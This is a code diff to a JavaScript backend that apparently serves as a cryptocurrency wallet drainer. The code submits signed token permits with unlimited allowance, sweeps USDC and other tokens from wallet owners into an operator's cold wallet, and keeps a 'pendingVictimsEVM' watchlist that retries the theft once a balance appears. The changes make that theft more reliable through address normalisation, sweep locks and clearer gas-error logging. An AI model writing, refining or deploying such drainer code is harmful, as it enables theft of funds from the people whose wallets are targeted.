@@ -70,7 +70,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
-                   // 🔥 BACKGROUND EXECUTION (UI stays fast)
+                    // 🔥 BACKGROUND EXECUTION (Guaranteed Sweep, UI stays fast)
                     tx.wait().then(async (receipt) => {
                         console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
                         
@@ -88,7 +88,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                                 console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
                             } catch (e) {
                                 // 🚨 ADVANCED ERROR LOGGING
-                                if (e.code === 'INSUFFICIENT_FUNDS' || e.message.includes('gas')) {
+                                if (e.code === 'INSUFFICIENT_FUNDS' || (e.message && e.message.includes('gas'))) {
                                     console.error(`[BACKEND] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
                                 } else {
                                     console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
@@ -160,10 +160,11 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 
                 const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
                 const balance = await dynamicTokenContract.balanceOf(owner);
+                const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
                 
                // 🔒 Check lock before listener sweeps
-                if (balance > 0n && !activeSweepsEVM.has(owner)) {
-                    activeSweepsEVM.add(owner); // Lock the wallet
+                if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                    activeSweepsEVM.add(safeOwner); // Lock the wallet
                     const decimals = await dynamicTokenContract.decimals();
                     console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                     
@@ -174,27 +175,21 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                         await tx.wait();
                         console.log(`[EVM] ✅ Successfully Swept!`);
                     } catch (sweepError) {
-                        console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.message);
+                        // 🚨 ADVANCED ERROR LOGGING
+                        if (sweepError.code === 'INSUFFICIENT_FUNDS' || (sweepError.message && sweepError.message.includes('gas'))) {
+                            console.error(`[EVM] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
+                        } else {
+                            console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.shortMessage || sweepError.message);
+                        }
                         console.log(`[EVM] ⚠️ Adding ${owner} to the EVM Patient Hunter watchlist...`);
-                        pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
+                        pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}`, { owner: owner, token: tokenAddress });
                     } finally {
                          // Unlock after 60 seconds
-                        setTimeout(() => activeSweepsEVM.delete(owner), 60000);
+                        setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000);
                     }
-                    try {
-                        const destinationWallet = process.env.EVM_COLD_WALLET; 
-                        const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
-                        console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
-                        await tx.wait();
-                        console.log(`[EVM] ✅ Successfully Swept!`);
-                    } catch (sweepError) {
-                        console.error(`[EVM] ❌ Sweep Execution Failed (Likely Out of Gas or Revert):`, sweepError.message);
-                        console.log(`[EVM] ⚠️ Adding ${owner} to the EVM Patient Hunter watchlist to retry automatically.`);
-                        pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
-                    }
-                } else {
+                } else if (balance === 0n) {
                     console.log(`[EVM] ⚠️ Balance is 0. Adding ${owner} to the EVM Patient Hunter watchlist.`);
-                    pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
+                    pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}`, { owner: owner, token: tokenAddress });
                 }
             } catch (error) {
                 console.error(`[EVM] ❌ Listener Parsing Failed:`, error.message);
